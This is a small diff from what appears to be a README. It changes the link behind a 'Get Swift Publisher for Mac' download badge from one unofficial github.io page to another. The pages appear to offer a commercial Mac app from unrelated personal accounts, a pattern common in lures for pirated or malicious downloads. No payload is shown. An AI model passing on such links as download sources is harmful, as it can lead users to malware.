@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-  <a href="https://manhyusuu48.github.io/.github/SwiftPublisher">  
+  <a href="https://tembilamusion.github.io/.github/SwiftPublisher">  
     <img src="https://img.shields.io/badge/⬇️_Get_Swift_Publisher_-2E8B57?style=for-the-badge&logo=apple&logoColor=white" alt="Get Swift Publisher for Mac">  
   </a>  
 </div>  
